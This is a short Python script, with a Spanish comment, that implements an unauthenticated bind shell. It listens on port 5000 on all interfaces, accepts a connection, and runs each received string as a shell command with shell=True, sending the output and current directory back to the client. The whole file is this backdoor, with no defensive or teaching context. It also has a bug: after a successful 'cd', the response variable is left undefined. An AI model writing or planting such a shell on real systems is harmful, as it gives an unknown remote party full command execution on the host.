import socket, subprocess, os;

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(('', 5000))
server_socket.listen()

client_socket, client_address = server_socket.accept()




while True:

    comando = client_socket.recv(4096).decode("utf-8")
    

    if comando.startswith('cd'):

        try:
            os.chdir(comando[2:].strip())

        except (FileNotFoundError, PermissionError) as e:

            respuesta = str(e)

    else:

        respuesta = subprocess.run(comando, shell=True, capture_output=True, text=True).stdout

    # Enviamos la respuesta y el directorio actual al cliente
    respuesta += f"\n{os.getcwd()} $"
    client_socket.send(respuesta.encode())







